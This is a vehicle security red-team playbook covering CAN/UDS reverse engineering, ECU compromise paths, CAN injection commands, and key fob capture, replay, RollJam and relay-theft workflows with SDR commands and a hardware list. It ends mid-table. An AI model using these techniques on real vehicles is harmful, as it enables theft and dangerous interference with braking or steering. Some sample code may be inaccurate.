# Automotive & Vehicle Security Playbook — End-to-End Red Team Workflow Guide

> Deep-dive companion to `skills/automotive-vehicle-security/SKILL.md`.
>
> Audience: red teamers and security engineers who know what CAN, UDS, and OBD-II are, and want a battle-tested playbook for taking a modern vehicle from physical OBD-II port access through internal bus reversing, ECU compromise, and physical-effect validation — without missing the safety controls that separate research from liability.

---

## Introduction

A modern vehicle is a network on wheels: 70-150 ECUs interconnected by 3-8 CAN buses, plus LIN for cheap body nodes, FlexRay for drive-by-wire, and MOST or Automotive Ethernet for infotainment multimedia. The gateway ECU arbitrates inter-bus traffic; the Telematic Control Unit (TCU) provides cellular/Wi-Fi uplink to the OEM cloud. Every rolling chassis is therefore an OT network with a routable path to the public internet. The 2015 Jeep Cherokee (Miller & Valasek, DEF CON 23) demonstrated the full kill chain: cellular modem → IVI → CAN bus → brakes, steering, and transmission at highway speed. The methodology has not changed; the threats have only expanded with connected services, OTA updates, and EV charging (ISO 15118).

This playbook walks the full engagement from architecture understanding through physical-effect validation, with emphasis on the legal, ethical, and safety boundaries that make automotive testing categorically different from generic embedded-systems work.

---

## CAN Bus Architecture Refresher

### The CAN Family of Buses

A 2025-era vehicle uses a mix of buses, each optimized for a different trade-off between cost, bandwidth, determinism, and reliability.

**CAN (Controller Area Network, ISO 11898)** is the dominant vehicle bus. Multi-master, broadcast, differential pair (CAN-H/CAN-L). Arbitration is non-destructive: the lowest arbitration ID wins. Classic CAN carries up to 8 bytes per frame; CAN-FD (2015) carries up to 64 bytes at dual bit-rate. Most passenger vehicles run CAN at 500 kbps; heavy-duty uses J1939 at 250 kbps; GMLAN single-wire at 33.3 kbps.

**LIN (Local Interconnect Network, ISO 17987)** is the cheap-bus cousin. Single-wire, 1-20 kbps, master-slave. Used for body nodes that don't need CAN's bandwidth or determinism: door locks, window motors, seat adjusters, sunroof. LIN has no authentication and no encryption; the master broadcasts a header, the addressed slave responds.

**FlexRay (ISO 17458)** is the deterministic bus for drive-by-wire. Dual-channel, 10 Mbps, time-triggered (TDMA). Used in premium vehicles for X-by-wire (brake-by-wire, steer-by-wire). Mostly displaced by CAN-FD and Automotive Ethernet in newer platforms; still common in BMW, Mercedes, Audi premium lines.

**MOST (Media Oriented Systems Transport)** is the infotainment multimedia bus. Fiber-optic ring, 25-150 Mbps. Carries audio, video, and control. Mostly displaced by Automotive Ethernet (100/1000BASE-T1) in 2020+ vehicles.

**Automotive Ethernet (100/1000BASE-T1, IEEE 802.3bp)** is the new backbone. Single twisted-pair, 100 Mbps or 1 Gbps, point-to-point with switches. Replaces MOST for infotainment and is moving into ADAS sensor connectivity (cameras, radar, lidar). Standard TCP/IP stack runs on top, including SOME/IP (Scalable service-Oriented MiddlewarE over IP) and DOIP (Diagnostics over IP, ISO 13400).

### ECU Roles and Bus Topology

A typical topology for a mid-segment 2024 vehicle:

```
                                    ┌──────────────┐
                                    │   TCU (LTE)  │─── cellular ─── OEM cloud
                                    │  Telematics  │
                                    └──────┬───────┘
                                           │ CAN
   ┌───────────┐   CAN-FD     ┌────────────┴───────────┐   CAN      ┌────────────┐
   │  ADAS ECU │ ─────────── │       GATEWAY ECU       │ ──────── │  Powertrain │
   │  (camera, │             │  (inter-bus arbiter,    │           │   CAN bus   │
   │   radar)  │             │   filtering, firewall)  │           │ ┌────────┐ │
   └───────────┘             └────────────┬───────────┘           │ │ Engine │ │
                                            │                       │ │  ECU   │ │
                                            │ CAN                   │ ├────────┤ │
                                            │                       │ │ Trans  │ │
                              ┌─────────────┴──────────┐            │ │  ECU   │ │
                              │    Infotainment bus     │            │ ├────────┤ │
                              │  ┌──────────────────┐  │            │ │  ABS   │ │
                              │  │      IVI / AAOS  │  │            │ │  ECU   │ │
                              │  │   (Android Auto) │  │            │ ├────────┤ │
                              │  └──────────────────┘  │            │ │  SRS   │ │
                              │  ┌──────────────────┐  │            │ │ (airbag│ │
                              │  │  Instrument Clst │  │            │ │  ECU)  │ │
                              │  └──────────────────┘  │            │ └────────┘ │
                              └────────────────────────┘            └────────────┘

                              ┌────────────────────────┐
                              │      Body CAN bus       │
                              │  (lights, wipers, AC,   │
                              │   seats, mirrors)       │
                              └────────────────────────┘
```

The **gateway ECU** is the critical control. It routes messages between buses and applies filtering rules. A permissive gateway (allow-all) is the canonical 2015-Jeep-Cherokee vulnerability. Modern R155 expectations: default-deny inter-bus ACL with explicit allowlist per message ID and direction.

The **TCU** is the remote attack surface. Cellular modem + Wi-Fi + GPS, with a CAN connection to one bus. A TCU RCE gives the attacker remote, internet-facing access to the CAN backbone.

The **IVI** runs a full OS (Android Automotive, QNX, or Linux). Cellular / Wi-Fi / Bluetooth / GPS / USB / CAN. An IVI RCE gives the attacker local access to the CAN bus via the gateway.

### Arbitration: CAN IDs and Priority

CAN arbitration is non-destructive: the lowest arbitration ID wins, and the winner continues transmitting while losers back off. This means low-numeric IDs have priority. Typical OEM allocation:

- 0x000-0x0FF: Safety-critical powertrain (engine torque, brake command)
- 0x100-0x2FF: Standard powertrain (RPM, speed, throttle)
- 0x300-0x4FF: Chassis (steering, ABS, ESC)
- 0x500-0x6FF: Body (lights, wipers, doors)
- 0x700-0x7FF: Diagnostic (UDS physical 0x7E0-0x7E7, functional 0x7DF)

CAN has no source identifier, no authentication, no encryption. Any ECU can transmit any arbitration ID. The protocol is secured by physical access to the wires.

### CAN vs UDS vs OBD-II — The Three Layers

These are frequently confused. They are distinct layers:

- **CAN (ISO 11898)**: the physical/data-link layer. Arbitration, framing, error detection.
- **ISO-TP (ISO 15765-2)**: the transport layer on top of CAN. Segments PDUs >7 bytes across multiple CAN frames. Used by UDS and OBD-II.
- **UDS (ISO 14229-1)**: the application-layer diagnostic protocol. Services 0x10-0x3E. Used by mechanics for fault codes, ECU flashing, and component initialization.
- **OBD-II (ISO 15031 / SAE J1979)**: the emissions-mandated subset of UDS. Modes 0x01-0x0A. Standardized PIDs (engine RPM, speed, DTCs). Readable by any consumer OBD-II scanner.

Every OBD-II mode is a UDS service (e.g., mode 0x01 ≈ UDS 0x22 with specific DIDs). UDS is a strict superset. CAN is the underlying transport.

---

## Building an Automotive Lab

### The Virtual Lab (Free, No Hardware)

For learning and protocol familiarization, no hardware is required. Linux SocketCAN provides a virtual CAN interface (`vcan`) that behaves exactly like a real CAN interface.

```bash
# Bring up a virtual CAN
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Two terminals:
# Terminal 1: passive listener
candump -L vcan0

# Terminal 2: sender
cansend vcan0 123#DEADBEEFCAFEBABE

# Or use vircar (vehicle simulator with realistic CAN traffic)
git clone https://github.com/daniel5151/vircar.git   # ACME-style virtual car
# Some alternatives: openstreetmap-vehicle-sim, commaai-rednose (openpilot simulator)
```

For UDS practice without hardware, use a UDS simulator such as `pyvit` (Python Vehicle Information Toolkit) or write a simple UDS responder in Python:

```python
# vcan_uds_responder.py — minimal UDS ECU simulator for lab use
import can
bus = can.interface.Bus(interface='socketcan', channel='vcan0')

while True:
    msg = bus.recv()
    if msg.arbitration_id not in (0x7DF, 0x7E0):
        continue
    # Parse the ISO-TP single frame
    if len(msg.data) < 2 or msg.data[0] >> 4 != 0:
        continue  # not a single frame
    pdu_len = msg.data[0] & 0x0F
    svc = msg.data[1]

    # Build response (positive: svc + 0x40)
    resp_svc = svc + 0x40
    resp_data = bytes([resp_svc]) + b'\x00' * 7
    resp = can.Message(arbitration_id=0x7E8, data=resp_data, is_extended_id=False)
    bus.send(resp)
```

### The Hardware Lab — Tiered Investment

| Tier | Cost | Hardware | Capability |
|------|------|----------|------------|
| 1 | ~$15 | ELM327 OBD-II adapter | OBD-II PIDs only (mode 0x01-0x0A). No raw CAN, no DBC reversing. Good for quick vehicle identification. |
| 2 | ~$50 | USBTin (MCP2515-based) | Raw CAN, classic CAN (8-byte), SocketCAN-compatible via slcand. Good for learning. |
| 3 | ~$100-200 | Macchina M2 / Arduino CAN shield | Open-source automotive dev board. 2x CAN, LIN, USB serial. Programmable for custom attacks. |
| 4 | ~$300-500 | PCAN-USB / Kvaser Leaf Light | Commercial-grade CAN adapter. Stable drivers, FD-capable (in newer models). OEM-dealer-tier tooling. |
| 5 | ~$400-800 | CANBadger v2 | Purpose-built attack tool. ESP32 + 2x CAN + Ethernet + Wi-Fi. Web UI for fuzz and injection. |
| 6 | ~$2000+ | Vector VN1630 / VN1640 | Industry-standard. Supports all CAN variants, LIN, FlexRay, MOST. Used by OEMs and Tier-1s. |
| 7 | ~$5000+ | Lauterbach Trace32 / P&E Micro Universal Multilink | JTAG / NEXUS / Aurora debuggers for ECU boot-mode extraction and live memory access. |

A reasonable lab progression for an individual researcher:

1. Start with vcan (free) — learn the tools, the workflow, the protocols.
2. Add a USBTin (~$50) — connect to your personal vehicle's OBD-II port, capture real traffic.
3. Buy a Macchina M2 (~$100) — program custom tools, practice CAN injection on a bench ECU.
4. Acquire a salvaged ECU from a junkyard (~$50-200) — full-time bench target without vehicle risk.
5. Consider a CANBadger (~$400) for serious fuzz/injection work.

A reasonable lab for an OEM red team:

1. Vector VN1630 + Lauterbach Trace32 (~$10k combined) — baseline.
2. CANBadger / custom hardware for field deployments.
3. Faraday cage + GPS-SDR-SIM for GNSS work.
4. PLC sniffer (QCA7500-based or Spirent) for ISO 15118.
5. A test vehicle on a closed course with explicit authorization.

### Salvaged ECU Bench Setup

A bench ECU gives you a realistic target without the safety risk of a moving vehicle.

```
┌──────────────┐         ┌───────────────┐
│  12V bench   │─────────│   ECU (e.g.,  │
│  power supply│  +12V   │  engine ECM)  │
│  (5A min)    │         │               │
└──────────────┘         └───────┬───────┘
       │                          │ CAN-H ──┐
       │                          │ CAN-L ──┤
       │                          │ GND   ──┤
       │                          └─────────┤
       │                                    │
┌──────┴───────┐                  ┌─────────┴────────┐
│  OBD-II to   │                  │ CAN transceiver  │
│  breakout    │                  │ + USBTin/M2      │
│  (DB9 to     │                  │                  │
│   J1962)     │                  └──────────────────┘
└──────────────┘

ECU power pins (typical):
  Pin 30 (constant 12V)  ─── bench supply
  Pin 15 (ignition 12V)  ─── bench supply (switched)
  Pin 31 (GND)           ─── bench supply ground
  Pin 6/14 (CAN-H/CAN-L) ─── CAN transceiver
```

Many ECUs require a "wake-up" sequence: pin 15 cycled, or a specific CAN message, to exit sleep mode. Salvage yards will often include the wiring diagram for a small fee.

---

## ECU Attack Methodology

### Phase 1: Passive Sniff

Never transmit on a vehicle CAN bus without explicit authorization. The first hour is always passive capture.

```bash
# 1. Bring up the interface (see payloads.md §1-3 for details)
sudo ip link set can0 type can bitrate 500000 && sudo ip link set up can0

# 2. Passive capture, 5+ minutes
candump -L can0 > trace_passive.asc

# 3. Inventory observed arbitration IDs
awk '{print $2}' trace_passive.asc | awk -F'#' '{print $1}' | sort -u | wc -l
awk '{print $2}' trace_passive.asc | awk -F'#' '{print $1}' | sort | uniq -c | sort -rn | head -20

# 4. Live delta view
cansniffer -c can0

# 5. Probe ISO-TP / UDS reachability (functional broadcast)
cansend can0 7DF#02010F0000000000   # mode 0x01 PID 0x0F intake air temp
# Response on 0x7E8 confirms engine ECU present
```

Document:
- Active arbitration IDs and their message rates (10 ms / 100 ms / 1000 ms).
- ECU tiers identified by ID range.
- Diagnostic bus addresses (0x7E0-0x7E7).
- ISO-TP multi-frame messages (first-frame byte = 0x1X, consecutive = 0x2X).

### Phase 2: DBC Reverse

Turn raw arbitration IDs into named signals.

```bash
# 1. Check OpenDBC for a leaked DBC matching the vehicle
git clone https://github.com/commaai/opendbc
ls opendbc/dbc/<make>/<model>.dbc

# 2. If found, decode captured frames
cantools dump opendbc/dbc/hyundai/hyundai_generic.dbc
cantools decode opendbc/dbc/hyundai/hyundai_generic.dbc --prune < trace_passive.asc

# 3. If NOT found, side-channel reverse
# Capture baseline, then manipulate one known state, capture again, diff
# (see payloads.md §4 for the full Python script)

# 4. Validate at least 3 known signals:
#    - RPM against tachometer
#    - Speed against GPS
#    - Brake light against pedal position sensor
# A DBC that doesn't validate is dangerous to use for injection.
```

Document:
- DBC source (leaked, side-channel reversed, OEM-provided).
- Validated signals and their physical interpretation.
- Unvalidated signals (do NOT use for injection).
- Model-year / firmware-version drift if comparing against an old DBC.

### Phase 3: UDS Enumerate

Walk every ECU on the diagnostic bus.

```python
# See payloads.md §6 for the full script
# Output per ECU:
#   - Supported UDS services
#   - Active session (default / programming / extended)
#   - 0x27 SecurityAccess availability and seed length
#   - 0x23 / 0x34 / 0x36 / 0x37 exposure (memory read / firmware download)
#   - DID values (VIN, ECU serial, boot software ID)
```

Document:
- Per-ECU service matrix.
- HIGH findings: 0x27 in default session, weak seed length, 0x23 exposed without authentication.
- CRITICAL findings: 0x34/0x36 firmware upload exposed without authentication.

### Phase 4: ECU Compromise

Achieve code execution or arbitrary memory access on a target ECU.

Common paths:

1. **0x27 SecurityAccess brute force or seed/key reuse** — for weak implementations
   (16-bit seed, simple XOR/LFSR key derivation), brute force in minutes. Cross-ECU
   seed/key reuse is common because Tier-1s share algorithms across OEM platforms.

2. **Boot-mode pin strap** — physical strap on the ECU board forces boot mode,
   bypassing secure boot. Requires opening the ECU (destructive).

3. **JTAG / SWD / NEXUS debug** — if the ECU's debug interface is not fused,
   attach a debugger and read memory directly. See `hardware-security`.

4. **Glitch attack** — voltage or clock glitching during secure boot verification
   can bypass signature checks. See `hardware-security` for the technique.

5. **Firmware extraction via NAND desoldering** — desolder the eMMC/NAND,
   read with a flash programmer, analyze offline with Ghidra.

### Phase 5: Physical Effect Validation

With the DBC decoded, UDS mapped, and (optionally) an ECU compromised, demonstrate a CAN injection that produces a measurable physical effect.

Standard, low-risk demonstration vectors:

- **Instrument cluster spoofing**: inject a fake RPM signal, watch the tachometer needle respond.
- **Steering wheel button injection**: send a "volume up" frame, watch the radio respond.
- **Body control**: send a "wipers on" frame, watch the wipers respond.
- **Light activation**: send a "high beam" frame, watch the lights respond.

HIGH-RISK demonstration vectors (require closed course + safety driver + explicit authorization):

- **Brake command injection** at speed — the Miller-Valasek Jeep vector.
- **Steering torque injection** at speed.
- **Transmission shift** at speed.
- **Airbag deployment** — usually requires specific crash-sensor emulation.

The 2015 Jeep demonstration took Miller & Valasek 14 months and was conducted on a closed airfield. Modern vehicles with gateway filtering and SecOC are significantly harder.

### The Post-Engagement Cleanup

CAN-IDS baselines, retained UDS sessions, and any test configurations must be reverted. Specifically:

- Close any extended diagnostic session (the ECU will auto-timeout after P2* expires, but verify).
- Clear any test DTCs (mode 0x04): `cansend can0 7DF#02040000000000`
- Restore OTA update configuration if modified.
- Verify no retained MQTT retained messages on the OEM cloud broker.
- Restore the DBC/ECU calibration if modified during testing.

Document the cleanup in the engagement report; the OEM's CSMS audit will check.

---

## CAN Bus Reverse Engineering Methodology

DBC file generation is the bottleneck for any CAN injection engagement. A correctly reversed DBC turns a 4-week engagement into a 4-hour one. The methodology below is the field-tested workflow used across multiple published vehicle security assessments (Miller & Valasek 2014-2015; Keen Lab 2017; Comma.ai openpilot 2019-present).

### Step 1: Baseline Capture

Before any analysis, capture a long baseline under controlled conditions.

```bash
# 1. Establish controlled conditions:
#    - Vehicle stationary, ignition ON, engine off (or idling if needed)
#    - Driver seat occupied
#    - All accessories OFF (HVAC, lights, audio)
#    - Brake NOT depressed
#    - Steering wheel at center (0 degrees)
#    - Gear selector in Park
#    - Outside on flat ground, no slope

# 2. Capture 5-10 minutes of baseline traffic
candump -L can0 > baseline_park.asc &
BASELINE_PID=$!
sleep 300   # 5 minutes
kill $BASELINE_PID

# 3. Inventory observed arbitration IDs and their rates
awk '{print $2}' baseline_park.asc | awk -F'#' '{print $1}' | sort | uniq -c | sort -rn | head -30 > baseline_rates.txt
cat baseline_rates.txt
# Output format: count <arbitration_id>
#   12345 7E0     (diagnostic, ~40 Hz from TesterPresent if you have a tool polling)
#   10000 2A0     (engine status, ~33 Hz = typical 30ms period)
#    5000 3F2     (body status, ~16 Hz)
```

### Step 2: Signal Identification by Side-Channel

The core technique: change ONE physical state, capture the bus, diff against baseline. The arbitration IDs whose data changed are the ones carrying the signal.

```python
#!/usr/bin/env python3
# diff_capture.py — diff two CAN captures to find which IDs changed
import sys, argparse

def parse_asc(path):
    """Parse a candump ASC file into {arb_id: [data_bytes,...]}."""
    frames = {}
    with open(path) as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) < 3 or '#' not in parts[2]:
                continue
            try:
                arb_id = int(parts[2].split('#')[0], 16)
                data = bytes.fromhex(parts[2].split('#')[1].split('_')[0])
                frames.setdefault(arb_id, []).append(data)
            except (ValueError, IndexError):
                continue
    return frames

def diff_buses(base, test):
    """Find arbitration IDs whose data differs between base and test."""
    changed = []
    for arb_id in sorted(set(base) & set(test)):
        base_last = base[arb_id][-1]
        test_last = test[arb_id][-1]
        if base_last != test_last:
            # XOR to find changed bits
            xor = bytes(a ^ b for a, b in zip(base_last, test_last))
            changed.append((arb_id, base_last, test_last, xor))
    return changed

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('baseline')
    parser.add_argument('test')
    args = parser.parse_args()
    base = parse_asc(args.baseline)
    test = parse_asc(args.test)
    changed = diff_buses(base, test)
    print(f"Found {len(changed)} changed arbitration IDs:")
    for arb_id, b, t, x in changed:
        print(f"  0x{arb_id:03X}:")
        print(f"    base: {b.hex()}")
        print(f"    test: {t.hex()}")
        print(f"    xor:  {x.hex()} (changed bits)")
```

**Standard side-channel triggers and what they reveal:**

| Action | Expected Changed IDs | Signal |
|--------|----------------------|--------|
| Depress brake pedal | 0x0E5, 0x165, 0x2A0 | Brake pressure, brake switch |
| Turn steering wheel 90° left | 0x025, 0x2A0, 0x3F2 | Steering angle |
| Press accelerator | 0x0E5, 0x165 | Throttle position, pedal position |
| Shift into Drive | 0x1E5, 0x3F0 | Gear selector |
| Turn on headlights | 0x3E0, 0x3E5 | Light switch status |
| Turn on wipers | 0x400, 0x405 | Wiper switch status |
| Open driver door | 0x3F5, 0x420 | Door status |
| Increase RPM (in Park) | 0x0C4, 0x0E5 | Engine RPM, throttle |
| Toggle high beam | 0x3E5, 0x3F0 | High beam switch |

### Step 3: DBC File Generation

Once you've identified candidate arbitration IDs and bit positions, encode them into a DBC file. The DBC format is text-based; you can hand-write it or use cantools to validate.

```python
#!/usr/bin/env python3
# write_dbc.py — generate a minimal DBC from reverse-engineered signals
import cantools

dbc_content = """VERSION ""

NS_ :

BS_:

BU_: XXX

BO_ 224 EngineStatus: 8 XXX
 SG_ EngineRPM : 0|16@1+ (0.25,0) [0|16383.75] "RPM" XXX
 SG_ ThrottlePosition : 16|8@1+ (0.4,0) [0|100] "%" XXX
 SG_ EngineTemp : 24|8@1+ (1,-40) [-40|215] "degC" XXX

BO_ 356 BrakeStatus: 8 XXX
 SG_ BrakePressure : 0|16@1+ (0.1,0) [0|6553.5] "bar" XXX
 SG_ BrakeSwitch : 16|1@1+ (1,0) [0|1] "" XXX
 SG_ ABSActive : 17|1@1+ (1,0) [0|1] "" XXX

BO_ 1010 SteeringStatus: 8 XXX
 SG_ SteeringAngle : 0|16@1- (0.1,0) [-3276.8|3276.7] "deg" XXX
 SG_ SteeringTorque : 16|16@1- (0.1,0) [-3276.8|3276.7] "Nm" XXX
"""

with open('reversed.dbc', 'w') as f:
    f.write(dbc_content)

# Validate by loading
db = cantools.database.load_file('reversed.dbc')
print(f"DBC valid: {len(db.messages)} messages")
for msg in db.messages:
    print(f"  0x{msg.frame_id:03X} {msg.name}: {len(msg.signals)} signals")
```

### Step 4: ID Arbitration Analysis

CAN arbitration is non-destructive: the lowest arbitration ID wins. Low IDs = high priority. Identify which IDs are safety-critical by their priority range.

```bash
# Sort captured IDs by arbitration priority
awk '{print $2}' baseline_park.asc | awk -F'#' '{print $1}' | sort -u | sort -n | head -30
# Typical output (Hyundai-Kia platform):
#   004    Engine torque request (highest priority, safety-critical)
#   005    Brake command
#   020    ABS status
#   03C    Steering angle
#   07F    Vehicle speed
#   ...
#   2A0    Engine RPM (informational)
#   3F2    Body status
#   7E0    Diagnostic (lowest priority for application traffic)

# The 0x000-0x0FF range is almost always safety-critical powertrain
# The 0x100-0x2FF range is standard powertrain
# The 0x300-0x4FF range is chassis
# The 0x500-0x6FF range is body
# The 0x700+ range is diagnostic
```

### Step 5: Multi-Frame CAN Analysis

Messages longer than 7 bytes use ISO-TP (ISO 15765-2) segmentation: a First Frame (0x1X prefix) followed by Consecutive Frames (0x2X prefix). UDS responses (VIN, DTC lists) and some proprietary multi-frame messages use this.

```bash
# Identify ISO-TP multi-frame messages in a capture
grep -E ' [0-9A-F]{3}#1[0-9A-F] ' baseline_park.asc | head -5
#   First Frame format: <arb_id>#1X<total_len_high><total_len_low><data...>
#   Example: 7E0#1014020100000000 (FF, len=0x0140=320 bytes)

# Consecutive Frames follow
grep -E ' [0-9A-F]{3}#2[0-9A-F] ' baseline_park.asc | head -5
#   CF format: <arb_id>#2X<data...>
#   Example: 7E0#2101010203040506 (CF, seq=1, data=...)

# Reassemble ISO-TP messages with python-isotp:
pip3 install isotp
python3 <<'EOF'
import isotp, can

bus = can.interface.Bus(interface='socketcan', channel='can0')
# isotp.Notifier-based reassembly
stack = isotp.Notifier(bus, address=isotp.Address(isotp.AddressingMode.Normal_11Bits, target_id=0x7E0))
# Send a UDS request that triggers a multi-frame response (VIN read)
req = can.Message(arbitration_id=0x7E0, data=bytes([0x03, 0x22, 0xF1, 0x90, 0, 0, 0, 0]))
bus.send(req)
# Receive the reassembled message
response = stack.recv(block=True, timeout=2.0)
print(f"Reassembled: {response.hex()}")
# Decode VIN: skip 0x10, 0x14, 0x62, 0xF1, 0x90 prefix
vin_bytes = response[5:5+17]
print(f"VIN: {vin_bytes.decode('ascii')}")
EOF
```

### Step 6: DBC Validation

A reversed DBC is dangerous to use for injection until validated. Validate at least 3 signals against known-good physical state.

```python
#!/usr/bin/env python3
# validate_dbc.py — validate a reversed DBC against physical reality
import can, cantools, time, statistics

db = cantools.database.load_file('reversed.dbc')
bus = can.interface.Bus(interface='socketcan', channel='can0')

# 1. Capture a sample
print("Capturing 30-second sample for validation...")
samples = {}
end_time = time.time() + 30
while time.time() < end_time:
    msg = bus.recv(timeout=1.0)
    if msg:
        samples.setdefault(msg.arbitration_id, []).append((msg.timestamp, msg.data))

# 2. Decode and validate
for arb_id, frames in samples.items():
    try:
        message = db.get_message_by_frame_id(arb_id)
    except KeyError:
        continue
    print(f"\n0x{arb_id:03X} ({message.name}):")
    decoded_samples = []
    for ts, data in frames:
        decoded = message.decode(data)
        decoded_samples.append((ts, decoded))
    # Report statistics
    for signal in message.signals:
        values = [d[signal.name] for ts, d in decoded_samples if signal.name in d]
        if values:
            print(f"  {signal.name}: min={min(values)}, max={max(values)}, "
                  f"mean={statistics.mean(values):.2f}, n={len(values)}")
            # Sanity checks
            if signal.name == 'EngineRPM':
                if max(values) > 8000:
                    print(f"    WARNING: RPM >8000 is unrealistic — check scaling")
            elif signal.name == 'VehicleSpeed':
                if max(values) > 300:
                    print(f"    WARNING: speed >300 km/h is unrealistic — check scaling")
            elif signal.name == 'SteeringAngle':
                if abs(max(values)) > 720 or abs(min(values)) > 720:
                    print(f"    WARNING: steering >720 deg is unrealistic — check scaling")
```

---

## Key Fob Attack Workflow

Key fob attacks split into two families: rolling-code replay (older 433/868 MHz remotes) and PKES relay (modern proximity-based). The toolchain and methodology differ significantly.

### Rolling-Code Capture with HackRF / SDR

The rolling-code workflow: capture raw RF, identify the modulation and protocol, extract the rolling code, and (for vulnerable implementations) replay later.

```bash
# ─── Step 1: Capture the raw RF signal ───
# US frequency: 433.92 MHz (most common); EU: 433.92 or 868.3 MHz; Asia: 315 MHz
# HackRF One is the gold standard (~$300); RTL-SDR works for capture-only (~$25)
hackrf_transfer -r fob_press1.cs8 -f 433920000 -s 2000000 -l 16 -g 40 -a 0
#   -r output file (.cs8 = 8-bit signed IQ samples)
#   -f frequency in Hz (433.92 MHz)
#   -s sample rate (2 MS/s is sufficient for 433 MHz OOK)
#   -l 16 = IF gain 16 dB; -g 40 = RF amp on; -a 0 = antenna power off
# Press the key fob button during the 5-second capture window
# Output: fob_press1.cs8 (~20 MB for 5 seconds at 2 MS/s)

# Capture multiple presses for analysis
for i in 2 3 4 5; do
    hackrf_transfer -r fob_press${i}.cs8 -f 433920000 -s 2000000 -l 16 -g 40 -a 0 &
    sleep 1
    echo "Press fob button now (${i}/5)..."
    wait
done

# ─── Step 2: Visual analysis in inspectrum ───
# Inspectrum is a waterfall viewer for SDR captures
sudo apt-get install inspectrum
inspectrum fob_press1.cs8
# In inspectrum:
#   - Set sample rate to 2 MS/s
#   - Adjust the FFT size and waterfall until you see a clear burst pattern
#   - The burst duration and symbol rate identify the protocol family:
#     ~10 ms burst at 2 kbaud  = Microchip HCS200/HCS301 (KeeLoq)
#     ~25 ms burst at 1 kbaud  = Princeton/EV1527 (fixed code)
#     ~50 ms burst at 5 kbaud  = Modern rolling code (varies)
#   - Export the demodulated bitstream

# ─── Step 3: Auto-detect protocol with rtl_433 ───
rtl_433 -r fob_press1.cs8 -A -vv
# -A = analyze mode (try to identify the protocol)
# -vv = very verbose
# Common outputs:
#   "HCS301: button=0x01, serial=0xABCDEF12, encrypted=0x11223344, counter=0x1234"
#   "Princeton-24bit: code=0x123456"
#   "Unknown protocol — try analyzing manually"

# ─── Step 4: Manual demodulation with Universal Radio Hacker ───
sudo apt-get install urh
urh
# In URH:
#   - Open fob_press1.cs8
#   - Set modulation: OOK (On-Off Keying) for most key fobs
#   - Set bit length: typically 100-500 us (2-10 kbaud)
#   - Detect the protocol structure: preamble, sync, data, checksum
#   - Save the demodulated bitstream
```

### Rolling-Code Analysis

```python
#!/usr/bin/env python3
# analyze_rolling_code.py — analyze a captured rolling-code transmission
# Detects: fixed-code, KeeLoq rolling-code, or modern encrypted rolling-code
import sys

def load_bits(path):
    """Load a bitstream file (one bit per character, '0' or '1')."""
    with open(path) as f:
        return f.read().strip()

def detect_protocol(bits):
    """Identify the protocol family from the bitstream."""
    n = len(bits)
    print(f"Bitstream length: {n} bits")
    
    if n == 12 or n == 24:
        return "Princeton/EV1527 fixed-code (replay trivially)"
    elif n == 66:
        return "Microchip HCS200/HCS301 (KeeLoq rolling-code)"
        # HCS301 structure:
        #   - 34-bit fixed portion (button + serial)
        #   - 32-bit encrypted portion (rolling counter + discrimination)
    elif n == 96:
        return "Modern rolling-code (varies by OEM)"
    elif n in (74, 76, 80):
        return "Older Asian-market remote"
    else:
        return f"Unknown — bit length {n} doesn't match known protocols"

def extract_hcs301(bits):
    """Extract fields from a Microchip HCS301 transmission."""
    # HCS301 format (66 bits):
    #   - Preamble: 12 bits (not always transmitted)
    #   - Header: 0xFFFE
    #   - Encrypted: 32 bits (counter + discrimination)
    #   - Serial: 28 bits
    #   - Button: 4 bits
    #   - Status/VLow: 2 bits
    if len(bits) < 66:
        return None
    # Align to start of fixed portion
    # (alignment is heuristic — look for the header pattern)
    encrypted_hex = hex(int(bits[0:32], 2))
    serial_hex = hex(int(bits[32:60], 2))
    button_hex = hex(int(bits[60:64], 2))
    return {
        'encrypted': encrypted_hex,
        'serial': serial_hex,
        'button': button_hex,
    }

if __name__ == '__main__':
    bits = load_bits(sys.argv[1])
    protocol = detect_protocol(bits)
    print(f"Detected: {protocol}")
    if 'HCS' in protocol:
        fields = extract_hcs301(bits)
        if fields:
            print(f"HCS301 fields: {fields}")
            print(f"  To replay: transmit the same bitstream via hackrf_transfer -t <file>")
            print(f"  Note: rolling code increments; replay only works once per counter value")
```

### RollJam Attack Workflow

The RollJam attack captures two consecutive codes by jamming the first and capturing the second. The jammed code remains valid for later use.

```bash
# RollJam requires concurrent jam + capture — illegal in most jurisdictions.
# The conceptual workflow:

# 1. Setup: two HackRF One devices
#    HackRF A: transmits a jamming signal on the key fob frequency (433.92 MHz)
#    HackRF B: captures the fob's transmission despite the jam
# 2. User presses fob:
#    Fob transmits code N (the "current" code)
#    HackRF A jams it; the car doesn't receive code N
#    HackRF B captures code N
# 3. User presses fob again (thinking the first press failed):
#    Fob transmits code N+1
#    HackRF A jams it; the car doesn't receive code N+1
#    HackRF B captures code N+1
# 4. Attacker replays code N+1 immediately:
#    Car receives code N+1 (valid); unlocks
#    Car's counter is now at N+1
# 5. Later, attacker replays code N:
#    Car still accepts code N (synchronous window typically allows N-1 to N+1)
#    Or car accepts code N because the next-expected counter is N+2,
#    but the sync window allows a 16-code rollback
#    The car unlocks again

# Detection footprint: high (sustained jamming is detectable; some
# modern fobs use frequency hopping to resist jam).

# Mitigation: dual-frequency rolling code, RF power anomaly detection,
# secure time-based codes (challenge-response instead of one-way).
```

### PKES Relay Attack Setup

The PKES relay attack doesn't break crypto; it relays the physical-layer challenge and response. The setup is hardware-intensive.

```
┌────────────┐                                ┌────────────┐
│   Thief A  │                                │   Thief B  │
│  (at car)  │                                │  (at fob)  │
└──────┬─────┘                                └──────┬─────┘
       │ LF loop antenna (125 kHz)                   │ LF loop antenna
       │ placed near car door handle                 │ placed near fob
       │                                             │
       │ Car sends LF challenge                      │ Fob receives LF challenge
       │ → received by Thief A's antenna             │ (relayed from Thief A)
       │                                             │
       │                                             │ Fob sends UHF response
       │                                             │ → received by Thief B's antenna
       │ Car receives UHF response                   │
       │ ← relayed from Thief B                      │
       │                                             │
       │ → UNLOCK / START                            │
       │                                             │
       └──── Analog RF link or Wi-Fi ────────────────┘
                 (carries LF + UHF bidirectionally)
```

Hardware required (bill of materials):

| Component | Cost | Purpose |
|-----------|------|---------|
| 2x LF loop antenna (125 kHz) | $50 each | Receive car's LF challenge, transmit to fob |
| 2x UHF Yagi antenna (433 or 868 MHz) | $30 each | Receive fob's UHF response, transmit to car |
| 2x bidirectional RF amplifier | $200 each | Boost signals over the relay link |
